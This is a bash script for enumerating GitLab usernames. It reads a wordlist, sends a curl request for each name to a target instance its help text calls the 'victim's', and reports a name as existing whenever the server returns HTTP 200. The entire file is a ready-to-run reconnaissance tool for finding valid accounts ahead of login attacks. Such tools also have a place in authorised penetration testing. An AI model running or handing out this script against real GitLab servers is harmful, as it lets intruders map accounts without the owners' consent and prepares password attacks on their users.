#!/bin/bash

#Colors
RED='\033[38;5;196m'
GREEN='\e[38;5;47m'
NC='\033[0m'
BOLD='\e[1m'
PINK='\e[38;5;198m'
Italic='\e[3m'
BBlue='\e[44m'
YELLOW='\033[0;33m'

VERBOSE=0   # Added for optional verbose mode

clear
echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo "                 🏴‍☠️  GitLab User Enumeration Script  🏴‍☠️"
echo "                 								                                                "
echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo ""

# Usage
usage() {
echo -e "${YELLOW}usage: ./gitlab_user_enum.sh --url <URL> --userlist <Username Wordlist> [-v]${NC}\n"

echo -e "${Italic}PARAMETERS:${NC}"
echo -e "-------------"
echo -e "-u/--url	The URL of your victim's GitLab instance"
echo -e "--userlist	Path to a username wordlist file (one per line)"
echo -e "-v		Enable verbose mode"
echo -e "-h/--help	Show this help message and exit"
echo -e "\n"
echo -e "${Italic}Example:${NC}"
echo -e "-------------"
echo -e "./gitlab_user_enum.sh --url http://gitlab.local/ --userlist /home/user/usernames.txt -v"
}

#check for params
args=("$@")
URL=""
user_list=""

for (( i=0; i < $#; i++))
{
	case ${args[$i]} in
	--url | -u)
	URL=${args[$((i+1))]}
	;;
	--userlist)
	user_list=${args[$((i+1))]}
	;;
	-v)
	VERBOSE=1
	;;
	-h | --help | "")
	usage
	exit 0
	;;
	esac
}

## checking the mandatory parameter (URL)
if [ -z "$URL" ]
then
    usage
    echo ""
    echo -e "${RED}${BOLD}The URL of your GitLab target (--url) is missing. ${NC}"
    exit 0
fi

# User Enumeration Function
enumeration(){

while IFS= read -r line
do
	HTTP_Code=$( curl -s -o /dev/null -w "%{http_code}" $URL/$line)

	if [ $HTTP_Code -eq 200 ]
	then
 	 echo -e "${GREEN}${BOLD}[+]${NC} The username ${GREEN}${BOLD}$line ${NC}exists!"
	elif [ $HTTP_Code -eq 000 ]
	then
	 echo -e "${BOLD}${RED}[!]${NC} The target is unreachable. Please make sure that you entered target's URL correctly and you have connection with it!"
	 exit 0
	else
		if [ "$VERBOSE" -eq 1 ]; then
			echo -e "${RED}${BOLD}[-]${NC} Username doesn't exist: $line"
		fi
	fi

done < "$user_list"

}

# Main
enumeration
